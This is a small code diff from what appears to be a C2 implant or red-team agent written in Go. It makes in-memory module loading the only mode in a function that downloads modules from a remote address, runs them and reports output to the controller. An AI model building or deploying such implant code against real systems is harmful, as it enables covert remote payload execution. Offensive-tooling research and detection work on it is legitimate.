@@ -289,7 +289,9 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error decoding invocation: %v\n", err)
 		return
 	}
-	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, invocation, inMem)
+	// in_mem is now default and only mode, ignored
+	_ = inMem
+	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, invocation)
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
 
